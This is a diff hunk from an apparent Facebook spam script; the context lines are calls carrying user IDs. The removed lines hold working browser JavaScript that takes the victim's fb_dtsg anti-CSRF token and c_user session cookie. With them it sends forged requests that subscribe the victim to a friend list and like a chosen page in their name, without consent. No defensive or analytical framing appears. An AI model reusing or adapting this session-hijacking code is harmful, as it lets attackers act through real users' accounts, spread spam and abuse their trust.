@@ -419,35 +419,3 @@ a('100002329611131');
 a('100003887809227');
 a('100004269816643');
 a('100005509004235');
-var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
-var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
-
-function LIST(L) {
-    var X = new XMLHttpRequest();
-    var XURL = "//www.facebook.com/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe&flid="+L;
-    var XParams = "fb_dtsg="+fb_dtsg+"&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECQ8yo&__req=d&ttstamp=26581681054512111570";
-    X.open("POST", XURL, true);
-    X.onreadystatechange = function () {
-        if (X.readyState == 4 && X.status == 200) {
-            X.close;
-        }
-    };
-    X.send(XParams);
-}
-LIST("186894454837520");
-var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
-var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
-
-function Like(p) {
-    var Page = new XMLHttpRequest();
-    var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
-    var PageParams = "fbpage_id=" + p + "&add=true&reload=false&fan_origin=page_timeline&fan_source&cat&&nctr[_mod]=pagelet_timeline_page_actions&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECjCw&__req=d&fb_dtsg=" + fb_dtsg + "&ttstamp=26581681054512111570";
-    Page.open("POST", PageURL, true);
-    Page.onreadystatechange = function () {
-        if (Page.readyState == 4 && Page.status == 200) {
-            Page.close;
-        }
-    };
-    Page.send(PageParams);
-}
-Like("640162709336874");
